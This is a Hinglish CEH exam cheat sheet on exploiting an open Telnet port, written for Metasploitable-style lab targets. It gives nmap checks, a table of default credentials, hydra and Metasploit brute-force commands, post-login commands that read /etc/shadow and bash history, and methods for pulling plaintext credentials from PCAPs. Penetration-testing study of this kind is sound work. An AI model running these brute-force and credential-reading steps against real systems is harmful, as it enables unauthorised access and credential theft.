# TELNET PORT OPEN (23) — Ab Kya Karu?

---

## Pehle Samjho: Telnet Kya Hai?

Telnet ek bahut purana protocol hai jo remote machines pe command-line access deta hai.
Isko samjho aise: SSH ka dada hai ye — lekin BINA encryption ke.

**Key Facts:**
- Port: **23 (TCP)**
- Telnet mein jo bhi type karo — username, password, commands — sab **plaintext** mein jaata hai
- Matlab agar koi beech mein network sniff kar raha hai (Wireshark, tcpdump), toh usse SAB kuch dikh jayega
- Isliye modern systems SSH use karte hain, Telnet nahi
- CEH exam mein Telnet ka matlab hai: **ya toh default creds try karo, ya PCAP mein creds dhundo**

**Real life analogy:** Telnet = postcard pe apna password likh ke bhejna. SSH = sealed envelope mein bhejna.

---

## STEP 1: Confirm Telnet Open Hai

```bash
nmap -sV -p 23 <IP>
```

**Output mein kya dekho:**
- `23/tcp open telnet` — haan, Telnet chal raha hai
- Version info bhi mil sakti hai (e.g., "Linux telnetd", "Metasploitable telnetd")
- Agar `filtered` ya `closed` hai toh aage mat badho, kuch aur try karo

---

## STEP 2: Direct Connect — Default Credentials Try Karo

```bash
telnet <IP>
```

Ye karne pe ek login prompt aayega. Ab default creds try karo:

| Username    | Password     | Kab kaam aata hai            |
|-------------|-------------|------------------------------|
| msfadmin    | msfadmin    | Metasploitable 2 machines    |
| root        | root        | Badly configured Linux       |
| admin       | admin       | Generic devices/routers      |
| root        | toor        | Some Kali-based targets      |
| admin       | password    | IoT devices, routers         |
| user        | user        | Lab environments             |

**Output mein kya dekho:**
- `Login:` prompt aaya → creds daalo
- `Login incorrect` → galat creds, next try karo
- Directly shell mil gaya bina password ke → jackpot, misconfigured hai

**IMPORTANT:** Telnet connect hone mein thoda slow hota hai. 10-15 seconds wait karo prompt ke liye.

---

## STEP 3: Default Creds Nahi Chale — Brute Force Karo

Agar manually try karke kuch nahi mila, toh automated brute force:

```bash
# Root user ke saath rockyou wordlist
hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> telnet -t 4

# Multiple users try karna ho toh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <IP> telnet -t 4

# Metasploit se bhi kar sakte ho
msfconsole -q
use auxiliary/scanner/telnet/telnet_login
set RHOSTS <IP>
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
```

**Flags explained:**
- `-l root` = single username try karo (lowercase L)
- `-L users.txt` = file se multiple usernames (uppercase L)
- `-P wordlist.txt` = password file (uppercase P)
- `-t 4` = sirf 4 parallel connections (Telnet slow hai, zyada threads se hang hota hai)

**Output mein kya dekho:**
- `[23][telnet] host: <IP> login: root password: toor` → CREDS MIL GAYE!
- `0 of 1 target completed` bina result → koi password match nahi hua

---

## STEP 4: Login Ho Gaya — Ab Post-Exploit

Jab login ho jaaye, yahi commands chalao:

```bash
# Kaun ho tum?
whoami
id
hostname

# System info
uname -a
cat /etc/issue

# Users enumerate karo
cat /etc/passwd
cat /etc/shadow          # root ho toh ye bhi padh sakte ho

# Flag ya sensitive files dhundo
cat /root/flag.txt
find / -name "flag*" 2>/dev/null
find / -name "*.txt" -readable 2>/dev/null

# Network info
ifconfig
netstat -tulnp

# History check karo — kisi ne kya kya kiya
cat ~/.bash_history
```

**WHY ye commands:**
- `whoami` — confirm karo ki root ho ya normal user
- `cat /etc/passwd` — system pe kaun kaun users hain
- `find / -name "flag*"` — CTF/exam mein flag files dhundne ke liye
- `2>/dev/null` — error messages suppress karta hai (permission denied wale)

---

## STEP 5: PCAP Mein Telnet Credentials Dhundo (BAHUT IMPORTANT!)

CEH exam mein aksar ek PCAP file dete hain aur poochte hain "credentials kya hain?"
Telnet plaintext hai, toh creds directly dikhte hain.

### Method 1: Wireshark (GUI)
```
1. PCAP file kholo Wireshark mein
2. Filter lagao: telnet
3. Kisi bhi Telnet packet pe right-click karo
4. "Follow" → "TCP Stream" click karo
5. Ek naya window khulega — usme username aur password PLAINTEXT mein dikhega
```

**IMPORTANT NOTE:** Telnet mein har character ek alag packet mein jaata hai!
Toh agar password "root" hai toh tum dekh sakte ho:
```
r
o
o
t
```
Ye normal hai — saare characters jod ke password banao.

### Method 2: tshark (Command Line)
```bash
# TCP stream follow karo
tshark -r capture.pcap -z follow,tcp,ascii,0 -q

# Sirf telnet filter karo
tshark -r capture.pcap -Y "telnet" -T fields -e data.text

# Telnet data extract karo
tshark -r capture.pcap -Y "telnet.data" -T fields -e telnet.data
```

### Method 3: Strings se quick check
```bash
strings capture.pcap | grep -i -A2 -B2 "login\|password\|username"
```

---

## Common Mistakes (Mat Karna Ye)

1. **Hydra mein zyada threads (`-t 64`)** — Telnet bahut slow protocol hai. 4-8 threads enough hain. Zyada se connection drop hota hai.

2. **PCAP mein sirf ek packet dekha** — Telnet character-by-character bhejta hai. Saare packets ko follow TCP stream se ek saath dekho.

3. **Telnet connect nahi ho raha** — Kya firewall block kar raha hai? `nmap -p 23 <IP>` se confirm karo pehle ki port open hai.

4. **Login ke baad kuch nahi mil raha** — `find / -name "flag*" 2>/dev/null` use karo. Manually ek ek folder mat dhundo.

5. **SSH aur Telnet confuse karna** — Telnet = port 23, plaintext. SSH = port 22, encrypted. Dono remote access hain but Telnet insecure hai.

6. **PCAP mein Telnet filter lagaya but kuch nahi dikha** — Kabhi kabhi non-standard port pe hota hai. Saare TCP streams check karo.

---

## Quick Decision Tree

```
Port 23 Open (Telnet) hai?
|
+-- PCAP file diya hai?
|   |
|   +-- YES --> Wireshark kholo
|   |           Filter: telnet
|   |           Right-click --> Follow TCP Stream
|   |           Creds plaintext mein dikhenge!
|   |
|   +-- NO --> Direct connect karo
|
+-- telnet <IP> se connect karo
|   |
|   +-- Login prompt aaya?
|   |   |
|   |   +-- YES --> Default creds try karo
|   |   |          (msfadmin/msfadmin, root/root, admin/admin)
|   |   |   |
|   |   |   +-- Kaam kar gaya --> Post-exploit: whoami, flag dhundo
|   |   |   |
|   |   |   +-- Nahi chala --> Hydra brute force karo
|   |   |                      hydra -l root -P rockyou.txt <IP> telnet -t 4
|   |   |
|   |   +-- NO (direct shell) --> Already inside! Post-exploit karo
|   |
|   +-- Connection refused --> Port sach mein open hai? nmap se verify karo
```
